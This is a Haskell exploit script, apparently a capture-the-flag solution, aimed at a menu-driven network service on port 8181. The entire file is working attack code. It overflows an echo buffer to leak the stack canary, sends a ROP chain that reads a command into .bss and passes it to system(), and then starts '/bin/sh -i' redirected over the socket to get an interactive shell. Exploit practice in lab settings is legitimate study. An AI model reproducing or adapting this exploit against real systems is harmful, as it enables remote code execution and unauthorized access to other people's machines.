{-# LANGUAGE OverloadedStrings #-}

import           Data.Bits
import qualified Data.ByteString.Char8 as BS
import           Data.Maybe            (catMaybes)
import           Data.Monoid           ((<>))
import           Numeric               (showHex)
import           Pwn

main :: IO ()
main = do
  r <- remote "0.0.0.0" 8181

  let system = 0x8048620
      recv   = 0x80486e0
      bss    = 0x804b1b4

      buflen = 0x28
      fd  = 4

      echo str = do
        recvuntil r "Select menu > "
        sendline r "1"
        recvuntil r "Input Your Message : "
        send r str
        recvuntil r "\n="

      exit = do
        recvuntil r "Select menu > "
        sendline r "3"

  info "leak canary"
  ret <- echo $ BS.replicate (buflen + 1) 'A'
  let Just c = u32 $ BS.take 4 $ BS.drop buflen ret
      canary = c .&. 0xffffff00
  success $ "canary = 0x" <> showHex canary ""

  info "send ROP"
  let buf = [ Just $ BS.replicate buflen 'A'
            , p32 canary
            , Just "BBBB"           -- 0x8048b83:        pop    ebx
            , Just "BBBB"           -- 0x8048b84:        pop    edi
            , p32 $ bss + 0x800     -- 0x8048b85:        pop    ebp
            , p32 recv              -- recv(fd, bss, 0x100, 0)
            , p32 system            -- system(bss)
            , p32 fd
            , p32 bss
            , p32 0x100
            , p32 0
            ]
  echo $ BS.concat $ catMaybes buf

  info "trigger ROP"
  exit

  info "execute '/bin/sh'"
  let fd' = BS.pack $ show fd
      cmd = "/bin/sh -i <&" <> fd' <> " >&" <> fd' <> " 2>&" <> fd'
  sendline r cmd

  interactive r
